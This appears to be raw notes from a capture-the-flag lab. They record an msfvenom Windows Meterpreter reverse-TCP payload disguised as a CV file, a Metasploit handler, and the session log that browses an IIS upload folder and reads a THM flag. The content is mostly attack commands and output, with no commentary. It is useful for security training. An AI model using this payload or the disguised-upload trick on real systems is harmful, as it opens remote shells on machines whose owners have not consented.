@@ -1,0 +1,104 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=5555 -f exe -o cv-username.exe
+
+
+
+┌──(root㉿kali)-[~]
+└─# sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 5555; exploit"
+
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+LHOST => tun0
+LPORT => 5555
+[*] Started reverse TCP handler on 10.8.28.227:5555 
+[*] Sending stage (200774 bytes) to 10.10.44.198
+[*] Meterpreter session 1 opened (10.8.28.227:5555 -> 10.10.44.198:49952) at 2022-12-16 09:46:27 -0500
+
+meterpreter > ls
+Listing: C:\Windows\system32
+============================
+
+Mode              Size       Type  Last modified              Name
+----              ----       ----  -------------              ----
+040777/rwxrwxrwx  0          dir   2018-09-15 05:07:31 -0400  0409
+100666/rw-rw-rw-  232        fil   2018-09-15 03:12:21 -0400  @AppHelpToast.png
+100666/rw-rw-rw-  308        fil   2018-09-15 03:12:19 -0400  @AudioToastIcon.png
+100666/rw-rw-rw-  450        fil   2018-09-15 03:12:09 -0400  @BackgroundAccessToastIcon.png
+100666/rw-rw-rw-  330        fil   2018-09-15 03:12:30 -0400  @EnrollmentToastIcon.png
+100666/rw-rw-rw-  404        fil   2018-09-15 03:12:39 -0400  @VpnToastIcon.png
+100666/rw-rw-rw-  518        fil   2018-09-15 03:12:16 -0400  @WindowsUpdateToastIcon.contrast-black.png
+100666/rw-rw-rw-  810        fil   2018-09-15 03:12:16 -0400  @WindowsUpdateToastIcon.contrast-white.png
+100666/rw-rw-rw-  518        fil   2018-09-15 03:12:16 -0400  @WindowsUpdateToastIcon.png
+100666/rw-rw-rw-  691        fil   2018-09-15 03:12:44 -0400  @WirelessDisplayToast.png
+100666/rw-rw-rw-  155        fil   2018-09-15 03:12:13 -0400  @WwanNotificationIcon.png
+
+
+
+Unrestricted 
+
+
+meterpreter > ls
+Listing: C:\inetpub
+===================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2022-11-09 05:18:15 -0500  custerr
+040777/rwxrwxrwx  0     dir   2022-11-23 00:41:41 -0500  history
+040777/rwxrwxrwx  0     dir   2022-11-09 05:33:02 -0500  logs
+040777/rwxrwxrwx  0     dir   2022-11-09 05:18:32 -0500  temp
+040777/rwxrwxrwx  4096  dir   2022-11-09 06:00:40 -0500  wwwroot
+
+meterpreter > cd wwwroot\\
+ls
+meterpreter > ls
+Listing: C:\inetpub\wwwroot
+===========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  4096   dir   2022-11-23 00:40:50 -0500  Santa
+100666/rw-rw-rw-  703    fil   2022-11-09 05:18:13 -0500  iisstart.htm
+100666/rw-rw-rw-  99710  fil   2022-11-09 05:18:13 -0500  iisstart.png
+
+meterpreter > cd Santa\\
+meterpreter > ls
+Listing: C:\inetpub\wwwroot\Santa
+=================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  44544   fil   2022-11-23 00:39:21 -0500  SantaSideKick2.Views.dll
+100666/rw-rw-rw-  4292    fil   2022-11-23 00:39:21 -0500  SantaSideKick2.Views.pdb
+100666/rw-rw-rw-  106574  fil   2022-11-23 00:39:21 -0500  SantaSideKick2.deps.json
+100666/rw-rw-rw-  10752   fil   2022-11-23 00:39:21 -0500  SantaSideKick2.dll
+100777/rwxrwxrwx  169984  fil   2022-11-23 00:39:21 -0500  SantaSideKick2.exe
+100666/rw-rw-rw-  2552    fil   2022-11-23 00:39:21 -0500  SantaSideKick2.pdb
+100666/rw-rw-rw-  224     fil   2022-11-23 00:39:21 -0500  SantaSideKick2.runtimeconfig.json
+040777/rwxrwxrwx  0       dir   2022-12-16 09:45:47 -0500  Uploads
+100666/rw-rw-rw-  162     fil   2022-11-23 00:39:21 -0500  appsettings.Development.json
+100666/rw-rw-rw-  192     fil   2022-11-23 00:39:21 -0500  appsettings.json
+100666/rw-rw-rw-  558     fil   2022-11-23 00:39:21 -0500  web.config
+040777/rwxrwxrwx  0       dir   2022-11-23 00:40:11 -0500  wwwroot
+
+meterpreter > 
+
+
+meterpreter > cd Documents\\
+lmeterpreter > ls
+Listing: C:\Users\HR_Elf\Documents
+==================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2022-11-14 00:58:40 -0500  My Music
+040777/rwxrwxrwx  0     dir   2022-11-14 00:58:40 -0500  My Pictures
+040777/rwxrwxrwx  0     dir   2022-11-14 00:58:40 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2022-11-14 01:03:16 -0500  desktop.ini
+100666/rw-rw-rw-  41    fil   2022-11-14 01:34:13 -0500  flag.txt
+
+meterpreter > type fla
+[-] Unknown command: type
+meterpreter > cat flag.txt 
+THM{Naughty.File.Uploads.Can.Get.You.RCE}meterpreter > 
